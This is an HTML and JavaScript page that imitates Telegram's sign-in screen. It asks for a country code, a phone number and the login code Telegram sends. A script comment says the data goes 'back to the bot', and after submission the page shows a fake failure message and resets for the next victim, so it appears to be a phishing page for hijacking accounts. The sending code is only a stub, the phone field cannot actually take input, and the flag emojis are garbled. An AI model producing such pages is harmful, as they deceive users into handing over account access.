<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to Telegram</title>
    <style>
        body {
            font-family: 'Helvetica Neue', Arial, sans-serif;
            background-color: #f5f5f5;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            background-color: #ffffff;
            padding: 20px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            border-radius: 10px;
            text-align: center;
            width: 100%;
            max-width: 400px;
        }

        .container img {
            width: 60px;
            margin-bottom: 20px;
        }

        h1 {
            font-size: 20px;
            color: #333333;
            margin-bottom: 10px;
        }

        p {
            font-size: 14px;
            color: #777;
            margin-bottom: 20px;
        }

        .input-group {
            margin-bottom: 15px;
            text-align: left;
        }

        .input-group label {
            display: block;
            font-size: 14px;
            color: #555;
            margin-bottom: 5px;
        }

        select, input[type="text"], input[type="number"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 16px;
            box-sizing: border-box;
            margin-bottom: 10px;
        }

        input[type="checkbox"] {
            margin-right: 10px;
        }

        .button {
            width: 100%;
            padding: 12px;
            background-color: #0088cc;
            color: #ffffff;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
        }

        .button:hover {
            background-color: #007ab8;
        }

        .monkey-icon {
            font-size: 50px;
            margin-bottom: 20px;
        }

        #verificationContainer, #finalMessageContainer {
            display: none;
        }

        /* Underline effect for phone number input */
        .input-underline {
            text-align: center;
            font-size: 18px;
            font-weight: bold;
            border-bottom: 1px solid #333;
            padding-bottom: 5px;
            letter-spacing: 1px;
        }

    </style>
</head>
<body>
    <div class="container" id="initialContainer">
        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo">
        <h1>Sign in to Telegram</h1>
        <p>Please confirm your country code and enter your phone number.</p>

        <div class="input-group">
            <label for="countryCode">Country</label>
            <!-- Country Code Dropdown -->
            <select id="countryCode" onchange="updatePhoneNumber()">
                <option value="+61" data-country="Australia">üá¶üá∫ Australia (+61)</option>
                <option value="+1" data-country="United States">üá∫üá∏ United States (+1)</option>
                <option value="+44" data-country="United Kingdom">üá¨üáß United Kingdom (+44)</option>
                <option value="+49" data-country="Germany">üá©üá™ Germany (+49)</option>
                <option value="+33" data-country="France">üá´üá∑ France (+33)</option>
                <option value="+81" data-country="Japan">üáØüáµ Japan (+81)</option>
                <option value="+91" data-country="India">üáÆüá≥ India (+91)</option>
                <option value="+86" data-country="China">üá®üá≥ China (+86)</option>
                <option value="+7" data-country="Russia">üá∑üá∫ Russia (+7)</option>
                <option value="+82" data-country="South Korea">üá∞üá∑ South Korea (+82)</option>
                <!-- Add more countries here -->
            </select>
        </div>

        <div class="input-group">
            <label for="phoneNumber">Phone Number</label>
            <div id="phoneNumberContainer" class="input-underline"></div>
        </div>

        <div>
            <input type="checkbox" id="keepSignedIn"> Keep me signed in
        </div>

        <!-- Next Button -->
        <button class="button" onclick="goToVerificationPage()">Next</button>
    </div>

    <div class="container" id="verificationContainer">
        <div class="monkey-icon">üêµ</div>
        <h1 id="phoneDisplay"></h1>
        <p>We have sent you a message in Telegram with the code.</p>

        <div class="input-group">
            <label for="verificationCode">Code</label>
            <input type="number" id="verificationCode" placeholder="Code">
        </div>

        <!-- Submit Button -->
        <button class="button" onclick="submitVerification()">Submit</button>
    </div>

    <div class="container" id="finalMessageContainer">
        <p id="finalMessage"></p>
    </div>

    <script>
        function updatePhoneNumber() {
            const countryCode = document.getElementById('countryCode').value;
            document.getElementById('phoneNumberContainer').textContent = countryCode + ' _____';
        }

        function goToVerificationPage() {
            const countryCode = document.getElementById('countryCode').value;
            const phoneNumberContainer = document.getElementById('phoneNumberContainer').textContent;
            const phoneNumber = phoneNumberContainer.replace(countryCode + ' ', '').trim();

            if (phoneNumber === '_____') {
                alert('Please enter your phone number.');
                return;
            }

            const fullPhoneNumber = `${countryCode} ${phoneNumber}`;

            document.getElementById('phoneDisplay').textContent = fullPhoneNumber;

            document.getElementById('initialContainer').style.display = 'none';
            document.getElementById('verificationContainer').style.display = 'block';
        }

        function submitVerification() {
            const phoneDisplay = document.getElementById('phoneDisplay').textContent;
            const verificationCode = document.getElementById('verificationCode').value;

            if (verificationCode === '') {
                alert('Please enter the verification code.');
                return;
            }

            // Send data back to the bot
            // This would typically involve an AJAX request or some other method of communication
            // alert(`Phone Number: ${phoneDisplay}\nVerification Code: ${verificationCode}`);

            // Display final message
            document.getElementById('finalMessage').textContent = `Sorry, we could not verify an account with the phone number ${phoneDisplay}.`;
            document.getElementById('verificationContainer').style.display = 'none';
            document.getElementById('finalMessageContainer').style.display = 'block';

            // Reset form for another use
            document.getElementById('phoneNumberContainer').textContent = '+__ _____';
            document.getElementById('verificationCode').value = '';
        }

        // Initialize phone number field with default country code
        updatePhoneNumber();
    </script>
</body>
</html>
